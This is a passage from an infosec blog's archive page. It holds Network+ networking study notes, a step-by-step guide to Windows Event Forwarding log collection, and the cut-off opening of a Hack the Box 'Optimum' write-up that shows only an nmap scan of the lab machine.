<div>Windows</div>
<ul>
<li>
<div>Random 64 bit Interface Identifier</div>
</li>
</ul>
</li>
<li>
<div>Unix</div>
<ul>
<li>
<div>Modified EUI-64</div>
<ul>
<li>
<div>Get MAC Address</div>
</li>
<li>
<div>Break into half</div>
</li>
<li>
<div>add ff:fe in the middle</div>
</li>
<li>
<div>flip 7th bit on the first 8 bits</div>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<div>Neighbor Advertisement</div>
</li>
</ul>
</li>
<li>
<div>IPV6 Tunneling</div>
<ul>
<li>
<div>Local router creates a tunnel to the IPv6 router to acquire IPv6 address to access resources.</div>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2>Ethernet and Switching</h2>
<ul>
<li>
<div>Layer 2 allows traffic between devices</div>
</li>
<li>
<div>Carrier Sense Multiple Access with Collision Detection (CSMA/CD)</div>
<ul>
<li>
<div>Collision Domain</div>
</li>
</ul>
</li>
<li>
<div>Duplex and speed</div>
<ul>
<li>
<div>Half Duplex &#8211; one device communicates at a time</div>
<ul>
<li>
<div>Walkietalkie</div>
</li>
</ul>
</li>
<li>
<div>Full Duplex &#8211; simultaneous communication between devices</div>
<ul>
<li>
<div>Telephone</div>
</li>
</ul>
</li>
</ul>
</li>
<li>
<div>Modern Collision Domain</div>
</li>
<li>
<div>Ethernet Speed</div>
<ul>
<li>
<div>GigabitEthernet speeds require full duplex</div>
</li>
</ul>
</li>
<li>
<div>Ethernet II Frame</div>
<ul>
<li>
<div>Destination MAC Address (48 bits)</div>
</li>
<li>
<div>Source MAC Address (48 bits)</div>
</li>
<li>
<div>Type (16 bits)</div>
</li>
<li>
<div>Data (1500 bytes)</div>
</li>
<li>
<div>FCS (32 bits)</div>
</li>
</ul>
</li>
<li>
<div>Protocol Data Unit (PDU) &#8211; Whole header</div>
</li>
</ul>
<h2>Network Topologies</h2>
<ul>
<li>
<div>BUS</div>
</li>
<li>
<div>Ring</div>
</li>
<li>
<div>Start</div>
</li>
</ul>
<h2>Switch</h2>
<ul>
<li>
<div>MAC Address Table</div>
</li>
<li>
<div>Broadcast</div>
<ul>
<li>
<div>Layer 2 Broadcast address</div>
<ul>
<li>
<div>Destination MAC address is all FFF&#8230;</div>
</li>
</ul>
</li>
<li>
<div>Broadcast domain &#8211; group of devices on a local area network</div>
</li>
</ul>
</li>
<li>
<div>Features</div>
<ul>
<li>
<div>Broadcast storms prevention</div>
</li>
<li>
<div>VLANs</div>
</li>
<li>
<div>Mirroring switch ports</div>
</li>
</ul>
</li>
<li>
<div>Connecting Switches</div>
<ul>
<li>
<div>Broadcast Messages</div>
</li>
<li>
<div>Broadcast Storm</div>
</li>
<li>
<div>Spanning Tree Protocols</div>
<ul>
<li>
<div>Shuts down redundancy</div>
</li>
</ul>
</li>
</ul>
</li>
<li>
<div>VLANs (Broadcast Domain)</div>
<ul>
<li>
<div>Trunk Link &#8211; connects switches that are using VLNS</div>
</li>
<li>
<div>Adds additional details pointing to destination VLAN</div>
</li>
<li>
<div>Also called as Tagged Ports</div>
</li>
<li>
<div>Trunklinks/Access links</div>
</li>
</ul>
</li>
<li>
<div>Switch Port Mirroring</div>
<ul>
<li>
<div>Collects traffic to analyze problems within network</div>
</li>
<li>
<div>Mirror the traffic of any port that we want</div>
</li>
</ul>
</li>
</ul>
<h2>Power over Ethernet (POE)</h2>
<ul>
<li>
<div>Gives power to connected devices</div>
</li>
</ul>
<h2>IP Routing</h2>
<ul>
<li>
<div>Routers</div>
<ul>
<li>
<div>2 Interfaces to operate</div>
<ul>
<li>
<div>Has unique IP Network</div>
</li>
</ul>
</li>
<li>
<div>IP Packet</div>
</li>
</ul>
</li>
</ul>
<div><img data-recalc-dims="1" loading="lazy" decoding="async" class="wp-image-1163 alignnone" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/ip-packet.png?resize=499%2C283&#038;ssl=1" alt="IP Packet" width="499" height="283" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/ip-packet.png?resize=300%2C170&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/ip-packet.png?w=502&amp;ssl=1 502w" sizes="auto, (max-width: 499px) 100vw, 499px"></div>
<ul>
<li style="list-style-type: none;">
<ul>
<li>
<div>ARP (Layer 2 Protocol)</div>
<ul>
<li>
<div>Retrieves layer 2 address using layer 3 address</div>
</li>
<li>
<div>Device maintains an ARP cache</div>
</li>
<li>
<div>ARP cache will age out entries</div>
</li>
<li>
<div>Bridge between L2 and L3</div>
</li>
</ul>
</li>
<li>
<div>Default Gateway (Router)</div>
<ul>
<li>
<div>ARP Default gateway</div>
</li>
<li>
<div>All router must be configured to forward traffic to the right gateway</div>
</li>
<li>
<div>IP segments of the destination addresses must be configured to the gateway</div>
</li>
<li>
<div>Every time a packet traversed gateway, its TTL will be decreased by 1</div>
</li>
<li>
<div>Static Routing</div>
</li>
<li>
<div>Dynamic outing</div>
<ul>
<li>
<div>Routing Protocols</div>
<ul>
<li>
<div>RIP</div>
</li>
<li>
<div>EIGRP</div>
</li>
<li>
<div>OSPF</div>
</li>
<li>
<div>BGP</div>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<div>Tools</div>
<ul>
<li>
<div>tracert</div>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2>Network Services</h2>
<ul>
<li>
<div>Network Topologies</div>
<ul>
<li>
<div>LAN/WLAN</div>
</li>
<li>
<div>WAN</div>
<ul>
<li>
<div>CAN</div>
</li>
<li>
<div>MAN</div>
</li>
</ul>
</li>
<li>
<div>SAN</div>
</li>
<li>
<div>PAN</div>
</li>
</ul>
</li>
</ul>
<h2>Network Address Translation</h2>
<ul>
<li>
<div>To communicate with the Internet</div>
</li>
<li>
<div>What it does</div>
<ul>
<li>
<div>Temporarily change the private source IP to a public source IP address</div>
</li>
</ul>
</li>
<li>
<div>Port Address Translation</div>
</li>
</ul>
<h2>Port Forwarding</h2>
<ul>
<li>
<div>Socket &#8211; IP:PORT</div>
<ul>
<li>
<div>192.168.1.1:1337</div>
</li>
</ul>
</li>
</ul>
<h2>Access Control Lists</h2>
<ul>
<li>
<div>Allow/Deny destination or source IP addresses</div>
</li>
</ul>
<h2>DHCP</h2>
<ul>
<li>
<div>Client will send discover message</div>
</li>
<li>
<div>DHCP Offer</div>
</li>
<li>
<div>DHCP Binding</div>
</li>
<li>
<div>IP Helper Address</div>
</li>
</ul>
<h2>DNS Hierarchy</h2>
<ul>
<li>
<div>Uniform Resource Locator (URL)</div>
<ul>
<li>
<div>TLD (.com, .net, .org)</div>
</li>
<li>
<div>SLD (google.com, trendmicro.com)</div>
</li>
<li>
<div>Third Level domain (www)</div>
</li>
<li>
<div>Subdomain (www.xxx.trendmicro.com)</div>
</li>
<li>
<div>Reverse DNS Lookup</div>
<ul>
<li>
<div>DNS Record Types</div>
<ul>
<li>
<div>A &#8211; IPv4 Record</div>
</li>
<li>
<div>AAAA &#8211; IPv6 Record</div>
</li>
<li>
<div>CNAME &#8211; Canonical Name Record (Alias)</div>
</li>
<li>
<div>MX &#8211; Mail Exchange Record</div>
</li>
<li>
<div>NS &#8211; Identifies Authoritative Name Server</div>
</li>
<li>
<div>PTR &#8211; Pointer Record</div>
</li>
<li>
<div>SRV &#8211; Service Record</div>
</li>
<li>
<div>TXT &#8211; miscellaneous use</div>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2>Internal vs External DNS</h2>
<ul>
<li>Internal domain name system zone</li>
<li>External domain name system zone
<ul>
<li>Uses Internet&#8217;s DNS</li>
</ul>
</li>
</ul>
<p><strong>Course Reference:</strong></p>
<p><a href="https://app.pluralsight.com/library/courses/comptia-network-plus-networking-concepts/">Pluralsight &#8211; Networking Concepts and Protocols</a></p>


<hr class="wp-block-separator">



<p><strong>Subscribe for more!</strong></p>



<p>To stay up to date with my latest posts and more InfoSec guides, make sure to subscribe to this blog by entering your email address below.</p>


	<div class="wp-block-jetpack-subscriptions__supports-newline wp-block-jetpack-subscriptions">
		<div class="wp-block-jetpack-subscriptions__container is-not-subscriber">
							<form action="https://wordpress.com/email-subscriptions" method="post" accept-charset="utf-8" data-blog="174576423" data-post_access_level="everybody" data-subscriber_email="" id="subscribe-blog-3">
					<div class="wp-block-jetpack-subscriptions__form-elements">
												<p id="subscribe-email">
							<label id="subscribe-field-3-label" for="subscribe-field-3" class="screen-reader-text">
								Type your emailâ€¦							</label>
							<input required="required" type="email" name="email" class="no-border-radius " style="font-size: 16px;padding: 15px 23px 15px 23px;border-radius: 0px;border-width: 1px;" placeholder="Type your emailâ€¦" value="" id="subscribe-field-3" title="Please fill in this field.">						</p>
												<p id="subscribe-submit">
							<input type="hidden" name="action" value="subscribe">
							<input type="hidden" name="blog_id" value="174576423">
							<input type="hidden" name="source" value="/?simply_static_page=1">
							<input type="hidden" name="sub-type" value="subscribe-block">
							<input type="hidden" name="app_source" value="">
							<input type="hidden" name="redirect_fragment" value="subscribe-blog-3">
							<input type="hidden" name="lang" value="en_US">
							<input type="hidden" id="_wpnonce" name="_wpnonce" value="b537a8bb39"><input type="hidden" name="_wp_http_referer" value="/?simply_static_page=1"><input type="hidden" name="post_id" value="1155">							<button type="submit" class="wp-block-button__link no-border-radius" style="font-size: 16px;padding: 15px 23px 15px 23px;margin: 0; margin-left: 10px;border-radius: 0px;border-width: 1px;" name="jetpack_subscriptions_widget">
								Subscribe							</button>
						</p>
					</div>
				</form>
								</div>
	</div>
	


<p>I promise I won&#8217;t be spamming your mailbox. Because no one loves spam. AMIRIGHT?</p>



<figure class="wp-block-image size-large"><img data-recalc-dims="1" loading="lazy" decoding="async" width="768" height="576" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/more-spam.gif?resize=768%2C576&#038;ssl=1" alt="" class="wp-image-1602"></figure>
	</div>
<!-- .entry-content -->

	<footer class="entry-footer">
		<span class="cat-links">Posted in <a href="/category/cheatsheets/" rel="category tag">Cheatsheets</a>, <a href="/category/networking/" rel="category tag">Networking</a></span> | <span class="tags-links">Tagged <a href="/tag/course/" rel="tag">course</a>, <a href="/tag/cybersecurity/" rel="tag">cybersecurity</a>, <a href="/tag/information-security/" rel="tag">Information Security</a>, <a href="/tag/networking/" rel="tag">networking</a>, <a href="/tag/pluralsight/" rel="tag">pluralsight</a>, <a href="/tag/protocols/" rel="tag">protocols</a></span>	</footer><!-- .entry-footer -->
</article><!-- #post-## -->

<article id="post-1132" class="post-1132 post type-post status-publish format-standard has-post-thumbnail hentry category-logs category-network-defense category-windows tag-cybersecurity tag-information-security tag-log-collection tag-network-defense tag-siem tag-windows no-featured-image-padding">
	<div class="post-thumbnail">
		<img width="3000" height="3000" src="/wp-content/uploads/2020/03/desktop.png" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" decoding="async" loading="lazy" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/desktop.png?w=3000&amp;ssl=1 3000w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/desktop.png?resize=300%2C300&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/desktop.png?resize=1024%2C1024&amp;ssl=1 1024w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/desktop.png?resize=150%2C150&amp;ssl=1 150w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/desktop.png?resize=768%2C768&amp;ssl=1 768w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/desktop.png?resize=1536%2C1536&amp;ssl=1 1536w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/desktop.png?resize=2048%2C2048&amp;ssl=1 2048w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/desktop.png?w=2340&amp;ssl=1 2340w" sizes="auto, (max-width: 3000px) 100vw, 3000px">	</div>
	<header class="entry-header">
		<h2 class="entry-title"><a href="/wec-and-wef-poor-mans-log-collection-on-windows/" rel="bookmark">Poor man&#8217;s log collection on Windows</a></h2>		<div class="entry-meta">
			<span class="posted-on">Posted on <a href="/wec-and-wef-poor-mans-log-collection-on-windows/" rel="bookmark"><time class="entry-date published" datetime="2020-03-28T08:13:20+08:00">March 28, 2020</time></a></span> | <span class="byline"> by <span class="author vcard"><a class="url fn n" href="/author/anotsodev/">anotsodev</a></span></span> | <span class="comments-link"><i class="fa fa-comments" aria-hidden="true"></i> <a href="/wec-and-wef-poor-mans-log-collection-on-windows/#respond">Leave a Comment<span class="screen-reader-text"> on Poor man&#8217;s log collection on Windows</span></a></span>		</div>
<!-- .entry-meta -->
			</header><!-- .entry-header -->
	<div class="entry-content">
		
<h2 class="wp-block-heading"><strong>Introduction</strong></h2>



<p>As your organization grows, a lot more log collectors either commercial or freeware are needed to be installed on your network to get logs from different servers running on Windows or *nix. </p>



<p>Let&#8217;s say for example this organization called <strong>kyle.biz</strong> has implemented Arcsight SmartConnectors deployed on Linux servers to get event logs on Windows. And based on my experience, setting up the SmartConnectors is tedious and maintaining them is sometimes a pain. </p>



<p>The limitations were also realized since SmartConnector only gets logs on the server static IPs configured during the installation so there is no way we&#8217;ll get the logs from other machines that have dynamic IPs. </p>



<p>Upon research, our team has stumbled upon this article&nbsp;from Microsoft&#8217;s <a rel="noreferrer noopener" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/use-windows-event-forwarding-to-assist-in-intrusion-detection" target="_blank">documentation page </a>and saw that Windows has already built-in log forwarding feature which is powerful and easy to configure!</p>



<p>So&nbsp;without further ado, let&#8217;s now configure the Source Initiated WEC and WEF on our servers!&nbsp;</p>



<h2 class="wp-block-heading"><strong>Prerequisites</strong></h2>



<p><strong>Windows Event Collector</strong></p>



<ul class="wp-block-list">
<li>
<strong>OS: </strong>Windows Server 2016Â </li>
<li>
<strong>Hostname: </strong>WEC01.internal.kyle.biz</li>
<li>
<strong>RAM:</strong> 16GB</li>
<li>
<strong>CPU:</strong> 4 Cores</li>
<li>
<strong>Storage:</strong><ul>
<li>Drive C:\ &#8211; 50GB</li>
<li>Drive D:\ &#8211; 60GB (we&#8217;ll save our forwarded logs here)</li>
</ul>
</li>
<li>Joined in a domain.</li>
</ul>



<p><strong>Windows Event Source</strong></p>



<ul class="wp-block-list">
<li>
<strong>OS: </strong>Windows Server 2016</li>
<li>
<strong>Hostname: </strong>CONSOLESERVER01.internal.kyle.biz</li>
<li>Joined in a domain.</li>
</ul>



<h2 class="wp-block-heading"><strong>WEC Server Configuration</strong></h2>



<p>On the following steps, we&#8217;ll be configuring our collector server to receive logs which will be initiated by source computers.</p>



<p><strong>Step 1: </strong>Open the Event Viewer and click the <strong>Subscription</strong>.</p>



<p><strong>Step 2: </strong>Right-click the Subscription to create a new Subscription. You can also see other actions on the right pane of the window.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="1301" height="780" src="https://i1.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-8.png?fit=818%2C490&amp;ssl=1" alt="" class="wp-image-1141" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-8.png?w=1301&amp;ssl=1 1301w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-8.png?resize=300%2C180&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-8.png?resize=1024%2C614&amp;ssl=1 1024w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-8.png?resize=768%2C460&amp;ssl=1 768w" sizes="auto, (max-width: 1170px) 100vw, 1170px"></figure></div>



<p><strong>Step 3</strong>: Enter the subscription name and select the subscription type as <strong>Source computer initiated.</strong></p>



<p><em>Before we proceed in adding <strong>computer groups,</strong>Â let&#8217;s first configure the events to collect and advanced settings.</em></p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img data-recalc-dims="1" loading="lazy" decoding="async" width="574" height="559" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-4.png?resize=574%2C559&#038;ssl=1" alt="" class="wp-image-1137" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-4.png?w=574&amp;ssl=1 574w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-4.png?resize=300%2C292&amp;ssl=1 300w" sizes="auto, (max-width: 574px) 100vw, 574px"></figure></div>



<p><strong>Step 4:</strong> Click the Select Events then click the manual edit/XML tab then copy the XML format query here: <a rel="noreferrer noopener" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/use-windows-event-forwarding-to-assist-in-intrusion-detection#appendix-e--annotated-baseline-subscription-event-query" target="_blank">Appendix E â€“ Annotated baseline subscription event query</a></p>



<p><strong>Step 5:</strong> Click OK</p>



<p><strong>Step 6:</strong> Click the Advanced Settings then select Minimize Latency.</p>



<p><strong>Step 7:</strong> Click OK</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img data-recalc-dims="1" loading="lazy" decoding="async" width="581" height="557" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-1.png?resize=581%2C557&#038;ssl=1" alt="" class="wp-image-1134" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-1.png?w=581&amp;ssl=1 581w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-1.png?resize=300%2C288&amp;ssl=1 300w" sizes="auto, (max-width: 581px) 100vw, 581px"></figure></div>



<p><strong>Step 8:</strong> We&#8217;ll now add our domain computers by clicking <strong>Select Computer Groups</strong>.</p>



<p><strong>Step 9:</strong> Since we are joined in a domain, click Add<strong> Domain Computers</strong> then search for the hostname of the event source. (Ex: CONSOLESERVER01.internal.kyle.biz)</p>



<p><strong>Step 10: </strong>Click OK</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img data-recalc-dims="1" loading="lazy" decoding="async" width="619" height="606" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-7.png?resize=619%2C606&#038;ssl=1" alt="" class="wp-image-1140" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-7.png?w=619&amp;ssl=1 619w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-7.png?resize=300%2C294&amp;ssl=1 300w" sizes="auto, (max-width: 619px) 100vw, 619px"></figure></div>



<p><strong>Step 11: </strong>Right-click the Forwarded Events then click on properties</p>



<p><strong>Step 12: </strong>Create folder <strong>Winenvt\Logs</strong> on drive D:\ then replace the log path by entering <strong>D:\Winevt\Logs\ForwardedEvents.evtx</strong> or refer to the screenshot below.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="1031" height="677" src="https://i2.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-6.png?fit=818%2C537&amp;ssl=1" alt="" class="wp-image-1139" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-6.png?w=1031&amp;ssl=1 1031w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-6.png?resize=300%2C197&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-6.png?resize=1024%2C672&amp;ssl=1 1024w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-6.png?resize=768%2C504&amp;ssl=1 768w" sizes="auto, (max-width: 1031px) 100vw, 1031px"></figure></div>



<h2 class="wp-block-heading"><strong>Event Source Configuration</strong></h2>



<p>On the following steps, we&#8217;ll be configuring the source computers to forward logs to our collector server.</p>



<p><strong>Step 1: </strong>Let&#8217;s now configure our event source server machine to point the SubscriptionManagers to ourÂ <strong>WEC</strong>.</p>



<p><strong>Step 2: </strong>Open the Local Group Policy then click the <strong>Event Forwarding</strong>Â to see the items under that directory.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="1301" height="718" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image.png?fit=818%2C451&amp;ssl=1" alt="" class="wp-image-1133" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image.png?w=1301&amp;ssl=1 1301w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image.png?resize=300%2C166&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image.png?resize=1024%2C565&amp;ssl=1 1024w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image.png?resize=768%2C424&amp;ssl=1 768w" sizes="auto, (max-width: 1170px) 100vw, 1170px"></figure></div>



<p><strong>Step 3: </strong>Click the <strong>Configure target Subscription Manager</strong>Â and enter on the value </p>



<p><code>"Server=<a href="http://kyle.internal.biz.org:5985/wsman/SubscriptionManager/WEC%2CRefresh=60">http://WEC01.internal.kyle.biz.org:5985/wsman/SubscriptionManager/WEC,Refresh=60</a>"</code></p>



<p><strong>Step 4:</strong> Click OK</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="1496" height="753" src="https://i1.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-3.png?fit=818%2C411&amp;ssl=1" alt="" class="wp-image-1136" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-3.png?w=1496&amp;ssl=1 1496w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-3.png?resize=300%2C151&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-3.png?resize=1024%2C515&amp;ssl=1 1024w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-3.png?resize=768%2C387&amp;ssl=1 768w" sizes="auto, (max-width: 1170px) 100vw, 1170px"></figure></div>



<p><strong>Step 5: </strong>Open Command Prompt then enter <em><code>gpudate /force</code> to apply</em> the modification in our local group policy.</p>



<p><strong>Step 6: </strong>Press Enter</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="1129" height="639" src="https://i2.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-2.png?fit=818%2C463&amp;ssl=1" alt="" class="wp-image-1135" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-2.png?w=1129&amp;ssl=1 1129w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-2.png?resize=300%2C170&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-2.png?resize=1024%2C580&amp;ssl=1 1024w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-2.png?resize=768%2C435&amp;ssl=1 768w" sizes="auto, (max-width: 1129px) 100vw, 1129px"></figure></div>



<p><strong>Step 7:</strong> Go back to the WEC server then check if the Baseline events already getting logs from our event source machine.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="1056" height="669" src="https://i1.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-5.png?fit=818%2C518&amp;ssl=1" alt="" class="wp-image-1138" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-5.png?w=1056&amp;ssl=1 1056w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-5.png?resize=300%2C190&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-5.png?resize=1024%2C649&amp;ssl=1 1024w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-5.png?resize=768%2C487&amp;ssl=1 768w" sizes="auto, (max-width: 1056px) 100vw, 1056px"></figure></div>



<p><strong>Step 8: </strong>We can already see that the events are already forwarded and ready to use for analysis.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="1070" height="699" src="https://i1.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-9.png?fit=818%2C534&amp;ssl=1" alt="" class="wp-image-1142" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-9.png?w=1070&amp;ssl=1 1070w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-9.png?resize=300%2C196&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-9.png?resize=1024%2C669&amp;ssl=1 1024w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/image-9.png?resize=768%2C502&amp;ssl=1 768w" sizes="auto, (max-width: 1070px) 100vw, 1070px"></figure></div>



<p>So that&#8217;s it! I hope you learned something new today and I hope you&#8217;ll be using this example to reduce the gap and have greater visibility on your network.</p>



<h2 class="wp-block-heading">References:</h2>



<ul class="wp-block-list">
<li><a rel="noreferrer noopener" href="https://docs.microsoft.com/en-us/windows/threat-protection/use-windows-event-forwarding-to-assist-in-instrusion-detection" target="_blank">https://docs.microsoft.com/en-us/windows/threat-protection/use-windows-event-forwarding-to-assist-in-instrusion-detection</a></li>
<li>
<a rel="noreferrer noopener" href="https://docs.microsoft.com/en-us/windows/win32/wec/setting-up-a-source-initiated-subscription" target="_blank">https://docs.microsoft.com/en-us/windows/win32/wec/setting-up-a-source-initiated-subscription</a><br>
</li>
</ul>



<hr class="wp-block-separator">



<p><strong>Subscribe for more!</strong></p>



<p>To stay up to date with my latest posts and more InfoSec guides, make sure to subscribe to this blog by entering your email address below.</p>


	<div class="wp-block-jetpack-subscriptions__supports-newline wp-block-jetpack-subscriptions">
		<div class="wp-block-jetpack-subscriptions__container is-not-subscriber">
							<form action="https://wordpress.com/email-subscriptions" method="post" accept-charset="utf-8" data-blog="174576423" data-post_access_level="everybody" data-subscriber_email="" id="subscribe-blog-4">
					<div class="wp-block-jetpack-subscriptions__form-elements">
												<p id="subscribe-email">
							<label id="subscribe-field-4-label" for="subscribe-field-4" class="screen-reader-text">
								Type your emailâ€¦							</label>
							<input required="required" type="email" name="email" class="no-border-radius " style="font-size: 16px;padding: 15px 23px 15px 23px;border-radius: 0px;border-width: 1px;" placeholder="Type your emailâ€¦" value="" id="subscribe-field-4" title="Please fill in this field.">						</p>
												<p id="subscribe-submit">
							<input type="hidden" name="action" value="subscribe">
							<input type="hidden" name="blog_id" value="174576423">
							<input type="hidden" name="source" value="/?simply_static_page=1">
							<input type="hidden" name="sub-type" value="subscribe-block">
							<input type="hidden" name="app_source" value="">
							<input type="hidden" name="redirect_fragment" value="subscribe-blog-4">
							<input type="hidden" name="lang" value="en_US">
							<input type="hidden" id="_wpnonce" name="_wpnonce" value="b537a8bb39"><input type="hidden" name="_wp_http_referer" value="/?simply_static_page=1"><input type="hidden" name="post_id" value="1132">							<button type="submit" class="wp-block-button__link no-border-radius" style="font-size: 16px;padding: 15px 23px 15px 23px;margin: 0; margin-left: 10px;border-radius: 0px;border-width: 1px;" name="jetpack_subscriptions_widget">
								Subscribe							</button>
						</p>
					</div>
				</form>
								</div>
	</div>
	


<p>I promise I won&#8217;t be spamming your mailbox. Because no one loves spam. AMIRIGHT?</p>



<figure class="wp-block-image size-large"><img data-recalc-dims="1" loading="lazy" decoding="async" width="768" height="576" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/more-spam.gif?resize=768%2C576&#038;ssl=1" alt="" class="wp-image-1602"></figure>



<p></p>
	</div>
<!-- .entry-content -->

	<footer class="entry-footer">
		<span class="cat-links">Posted in <a href="/category/logs/" rel="category tag">Logging</a>, <a href="/category/network-defense/" rel="category tag">Network Defense</a>, <a href="/category/windows/" rel="category tag">Windows</a></span> | <span class="tags-links">Tagged <a href="/tag/cybersecurity/" rel="tag">cybersecurity</a>, <a href="/tag/information-security/" rel="tag">Information Security</a>, <a href="/tag/log-collection/" rel="tag">log-collection</a>, <a href="/tag/network-defense/" rel="tag">network-defense</a>, <a href="/tag/siem/" rel="tag">siem</a>, <a href="/tag/windows/" rel="tag">windows</a></span>	</footer><!-- .entry-footer -->
</article><!-- #post-## -->

<article id="post-1097" class="post-1097 post type-post status-publish format-standard has-post-thumbnail hentry category-ctf category-hack-the-box category-pentesting category-writeups tag-hackthebox tag-optimum tag-writeup no-featured-image-padding">
	<div class="post-thumbnail">
		<img width="1024" height="1024" src="/wp-content/uploads/2017/09/image1501218566.jpeg" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" decoding="async" loading="lazy" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/image1501218566.jpeg?w=1024&amp;ssl=1 1024w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/image1501218566.jpeg?resize=300%2C300&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/image1501218566.jpeg?resize=150%2C150&amp;ssl=1 150w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/image1501218566.jpeg?resize=768%2C768&amp;ssl=1 768w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/image1501218566.jpeg?resize=100%2C100&amp;ssl=1 100w" sizes="auto, (max-width: 1024px) 100vw, 1024px">	</div>
	<header class="entry-header">
		<h2 class="entry-title"><a href="/hack-the-box-optimum/" rel="bookmark">Hack the Box Optimum</a></h2>		<div class="entry-meta">
			<span class="posted-on">Posted on <a href="/hack-the-box-optimum/" rel="bookmark"><time class="entry-date published" datetime="2017-10-29T05:00:10+08:00">October 29, 2017</time></a></span> | <span class="byline"> by <span class="author vcard"><a class="url fn n" href="/author/anotsodev/">anotsodev</a></span></span> | <span class="comments-link"><i class="fa fa-comments" aria-hidden="true"></i> <a href="/hack-the-box-optimum/#respond">Leave a Comment<span class="screen-reader-text"> on Hack the Box Optimum</span></a></span>		</div>
<!-- .entry-meta -->
			</header><!-- .entry-header -->
	<div class="entry-content">
		<p>This is a write-up of the retired Optimum box on Hack the Box.</p>
<p>First thing I did was to fire up nmap and ran this command.</p>
<pre>nmap -sV -sC -oA optimum 10.10.10.8</pre>
<p>And got this result.</p>
